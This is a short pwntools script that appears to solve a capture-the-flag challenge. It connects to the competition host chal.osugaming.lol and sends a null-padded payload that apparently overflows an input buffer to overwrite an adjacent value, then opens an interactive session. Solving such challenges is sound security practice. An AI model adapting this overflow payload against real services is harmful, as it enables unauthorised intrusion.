from pwn import *

elf = ELF('./challenge-4')

#p = process(elf.path)
p = remote('chal.osugaming.lol', 7279)

p.recvuntil(b'How much pp did you get? ')
p.sendline(b'727')
p.recvuntil(b'Any last words?')
solve = b'727\x00'
solve = solve + b'\x00'*(0x16-len(solve))
solve =solve + b'\x00'*4
p.sendline(solve)
p.interactive()
